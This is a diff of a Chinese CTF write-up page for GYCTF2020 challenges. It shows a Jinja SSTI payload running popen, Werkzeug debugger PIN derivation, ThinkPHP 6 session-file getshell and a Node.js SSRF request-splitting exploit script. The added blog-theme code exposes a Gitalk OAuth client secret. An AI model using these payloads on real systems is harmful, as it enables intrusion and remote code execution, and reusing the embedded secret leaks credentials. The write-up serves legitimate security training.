 <pre><code class="python">{{''.__class__.__base__.__subclasses__()[77].__init__.__globals__['sys'].modules['o'+'s'].__dict__['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read()}}
 </code></pre>
 <p>将payload进行base64编码，再在题目中解码触发SSTI进行RCE：</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306172255728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306172255728.png" alt="在这里插入图片描述"></p>
 <h4 id="预期解：利用PIN码进行RCE"><a href="#预期解：利用PIN码进行RCE" class="headerlink" title="预期解：利用PIN码进行RCE"></a>预期解：利用PIN码进行RCE</h4><p>参考这篇文章：<a href="https://www.anquanke.com/post/id/197602" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197602</a></p>
 <p>要想生成PIN码，我们需要获得下面几个信息，这里就不考虑RCE了，所需要的信息均可以通过读文件来获得：</p>
-<p>（1）服务器运行flask所登录的用户名。通过读取/etc/password可知此值为：<code>flaskweb</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182207863.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>（2）modname的值。一般不变就是<code>flask.app</code></p>
+<p>（1）服务器运行flask所登录的用户名。通过读取/etc/password可知此值为：<code>flaskweb</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182207863.png" alt="在这里插入图片描述"><br>（2）modname的值。一般不变就是<code>flask.app</code></p>
 <p>（3） <code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>的结果。就是<code>Flask</code>，也不会变</p>
-<p>（4）flask库下app.py的绝对路径。在报错信息中可以获取此值为： <code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182459368.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>（5）当前网络的mac地址的十进制数。通过文件<code>/sys/class/net/eth0/address</code>读取，eth0为当前使用的网卡：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182704459.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>将<code>0242ae00ecc2</code>转换为10进制为：<code>2485410393282</code></p>
+<p>（4）flask库下app.py的绝对路径。在报错信息中可以获取此值为： <code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182459368.png" alt="在这里插入图片描述"><br>（5）当前网络的mac地址的十进制数。通过文件<code>/sys/class/net/eth0/address</code>读取，eth0为当前使用的网卡：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182704459.png" alt="在这里插入图片描述"><br>将<code>0242ae00ecc2</code>转换为10进制为：<code>2485410393282</code></p>
 <p>（6）机器的id。</p>
 <ul>
 <li>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_i</code>，有的系统没有这两个文件。</li>
 <li>对于docker机则读取<code>/proc/self/cgroup</code>，其中第一行的<code>/docker/</code>字符串后面的内容作为机器的id，如下为<code>1834da85a17efb2029d4a9c8e8f71fe40a96862055c636788c9835665e8e3359</code></li>
 </ul>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306183250928.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306183250928.png" alt="在这里插入图片描述"></p>
 <p>然后用kingkk师傅的exp：</p>
 <pre><code class="python">import hashlib
 from itertools import chain
@@ -487,23 +530,23 @@ if rv is None:
 print(rv)
 </code></pre>
 <p>得到PIN码：<code>119-747-372</code></p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306184649989.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306184649989.png" alt="在这里插入图片描述"></p>
 <p>输入PIN后就可以在python终端任意执行代码了：</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/202003061846353.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/202003061846353.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1 id="EasyThinking"><a href="#EasyThinking" class="headerlink" title="EasyThinking"></a>EasyThinking</h1><p>这一题利用的是ThinkPHP6.0任意文件创建漏洞，分析可以参考这篇文章：<a href="https://www.anquanke.com/post/id/197261" target="_blank" rel="noopener">ThinkPHP6.0任意文件创建分析</a></p>
 <p>简单说就是这个漏洞可以通过session来任意创建文件（文件名可控），并且当session里的数据可控的话，我们就可以控制创建的文件的内容，从而getshell。</p>
 <p>扫描发现/<a href="http://www.zip下载源码，除了注册和登录外还有一个搜索功能，通过源码可以看到我们搜索的值会被写入session中，因此利用我们就可以利用这个漏洞任意创建内容可控的文件：" target="_blank" rel="noopener">www.zip下载源码，除了注册和登录外还有一个搜索功能，通过源码可以看到我们搜索的值会被写入session中，因此利用我们就可以利用这个漏洞任意创建内容可控的文件：</a></p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315115458626.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315115458626.png" alt="在这里插入图片描述"></p>
 <p>首先注册一个用户，并在登陆的时候将PHPSESSID的值改为长度为32的php文件名，如<code>1111111111111111111111111111.php</code>：</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315120241769.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p>然后在搜索功能中输入文件的内容：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200315120711196.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315120241769.png" alt="在这里插入图片描述"></p>
+<p>然后在搜索功能中输入文件的内容：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200315120711196.png" alt="在这里插入图片描述"></p>
 <p>Thinkphp6默认把session文件存在/runtime/session目录下面，并保存为sess_xxx的形式：</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/202003151150596.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/202003151150596.png" alt="在这里插入图片描述"></p>
 <p>所以访问<code>/runtime/session/sess_1111111111111111111111111111.php</code>就是我们写入的文件：</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315120918971.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315120918971.png" alt="在这里插入图片描述"></p>
 <p>然后就是bypass disable functions了，直接上传&lt;php7.4的通杀POC执行/readflag即可：</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315121416838.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315121416838.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1 id="Node-Game"><a href="#Node-Game" class="headerlink" title="Node Game"></a>Node Game</h1><blockquote>
 <p>首先放上出题人的<a href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game" target="_blank" rel="noopener">writeup。</a></p>
@@ -651,7 +694,7 @@ var server = app.listen(8081, function() {
 <p>根据上面几点，可以大致判断是利用SSRF伪造本地ip进行文件上传，上传包含命令执行代码的pug文件（可以搜一下pug文件的代码格式）到/template目录下，然后用<code>?action=</code>来包含该文件。</p>
 <p>现在问题就是如何用SSRF来进行文件上传，这里就是Node js的编码处理安全问题，可以参考这篇文章：<a href="https://xz.aliyun.com/t/2894" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894</a></p>
 <p>如果对编码经过精心的构造，就可以通过拆分请求实现的SSRF攻击（也就是一种CRLF注入），通过换行让服务端将我们的第一次请求下面构造的报文内容，当作一次单独的HTTP请求，而这个构造的请求就是我们的文件上传请求了。</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315164810466.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>由上面文章中的内容可知，通常的换行<code>\r\n（%0D%0A）</code>，我们可以构造为<code>\u010D\u010A</code>。<br>同理其他的一些特殊字符，如<code>空格(%20)</code>构造编码为<code>\u0120</code>，<code>+(%2B)</code>构造编码构造为<code>\u012B</code>…</p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315164810466.png" alt="在这里插入图片描述"><br>由上面文章中的内容可知，通常的换行<code>\r\n（%0D%0A）</code>，我们可以构造为<code>\u010D\u010A</code>。<br>同理其他的一些特殊字符，如<code>空格(%20)</code>构造编码为<code>\u0120</code>，<code>+(%2B)</code>构造编码构造为<code>\u012B</code>…</p>
 <p>根据这个编码方式，就可以构造出拆分的请求从而SSRF了，参考<a href="http://iv4n.cc/2020-wp-vol1/#xctf%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB" target="_blank" rel="noopener">iv4n的exp</a>:</p>
 <pre><code class="python">import requests
 
@@ -692,298 +735,120 @@ requests.get(
 print(requests.get(
     &#39;http://5750e068-33b5-4a65-a6bf-82412fdee97e.node3.buuoj.cn/?action=lethe&#39;).text)
 </code></pre>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315171235568.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315171235568.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <p>参考：<br><a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">新春战疫公益赛-ezsqli-出题小记</a><br><a href="http://iv4n.cc/2020-wp-vol1/" target="_blank" rel="noopener">http://iv4n.cc/2020-wp-vol1/</a></p>
 
-            <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-              <span>
-                <i class="iconfont icon-inbox"></i>
-                
-                  <a class="hover-with-bg" href="/categories/Writeup">Writeup</a>
-                  &nbsp;
-                
-              </span>&nbsp;&nbsp;
-            
-            
-              <span>
-                <i class="iconfont icon-tag"></i>
-                
-                  <a class="hover-with-bg" href="/tags/Writeup">Writeup</a>
-                
-              </span>
-            
-            </p>
-            
-              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
-            
-          </div>
         </div>
-      </div>
-    </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
-    <div id="tocbot"></div>
-  </div>
 
-    </div>
-  </div>
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://lethe.site/2020/03/06/GYCTF2020-Writeup/">https://lethe.site/2020/03/06/GYCTF2020-Writeup/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/">通过两道CTF题学习过滤单引号的SQL注入</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/">GXYCTF2019&GWCTF2019——Writeup</a>
+            
+        </section>
+
+
+    </article>
 </div>
 
-<!-- custom -->
+</body>
 
-
-<!-- Comments -->
-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
-    
-      <br><br>
-      
-      
-  <div class="disqus" style="width:100%">
-    <div id="disqus_thread"></div>
-    <script>
-      var disqus_config = function () {
-        this.page.url = 'https://lethe.site/2020/03/06/GYCTF2020-Writeup/';
-        this.page.identifier = '/2020/03/06/GYCTF2020-Writeup/';
-      };
-      var oldLoad = window.onload;
-      window.onload = function () {
-        var d = document, s = d.createElement('script');
-        s.type = 'text/javascript';
-        s.src = '//' + 'Lethe' + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-      };
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
-        powered by Disqus.</a></noscript>
-  </div>
-
-
-    
-  </div>
-</div>
-
-    
-  </main>
-
-  
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
-    </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-  
-
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
-    
-  
-    <!-- 不蒜子统计PV -->
-    
-    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
-  
-  
-    <!-- 不蒜子统计UV -->
-    
-    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
-  
-  <br>
-
-
-
-    
-
-
-    <!-- cnzz Analytics icon -->
-    
-
-  </div>
-</footer>
-
-<!-- SCRIPTS -->
-<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
-<script src="https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js"></script>
-<script src="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
-<script src="https://cdn.staticfile.org/mdbootstrap/4.8.9/js/mdb.min.js"></script>
-<script src="/js/main.js"></script>
-<script>
-(function(){
-    var bp = document.createElement('script');
-    var curProtocol = window.location.protocol.split(':')[0];
-    if (curProtocol === 'https'){
-   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-  }
-  else{
-  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-  }
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(bp, s);
-})();
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'b00b0a7008ebc4264da3',
+        clientSecret: 'd2cd3318af9e2b076eb378ac846e0e37341260ff',
+        repo: 'blog',
+        owner: 'Lethe',
+        admin: 'Lethe',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
 </script>
 
-  <script src="/js/lazyload.js"></script>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span><font face="Comic Sans MS">Life is a struggle.</font></span>
+        <br>
+        <span><font face="Comic Sans MS">Lethe © 2018 - 2020</font></span>
+
+        <span> · 
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
 
 
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
 
-  
-    <script src="https://cdn.staticfile.org/tocbot/4.8.0/tocbot.min.js"></script>
-  
-  <script src="/js/post.js"></script>
+          </span>
+    </div>
+</footer>
 
-
-
-  <script src="https://cdn.staticfile.org/smooth-scroll/16.1.0/smooth-scroll.min.js"></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-<!-- Plugins -->
-
-
-  
-    <!-- Baidu Analytics -->
-    <script>
-      var _hmt = _hmt || [];
-      (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?99792b18d5c4379d7bc5cf4bced8a563";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-      })();
-    </script>
-  
-
-  
-
-  
-
-  
-
-  <!-- cnzz Analytics -->
-  
-
-
-
-  <script src="https://cdn.staticfile.org/prettify/r298/prettify.min.js"></script>
-  <script>
-    $(document).ready(function () {
-      $('pre').addClass('prettyprint  ');
-      prettyPrint();
-    })
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/typed.js/2.0.10/typed.min.js"></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "GYCTF2020_Writeup&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/anchor-js/4.2.0/anchor.min.js"></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "false",
-      
-      icon: "§"
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script src="/js/local-search.js"></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      getSearchFile(path);
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
-  <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
-      function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
+    </div>
 </body>
 </html>
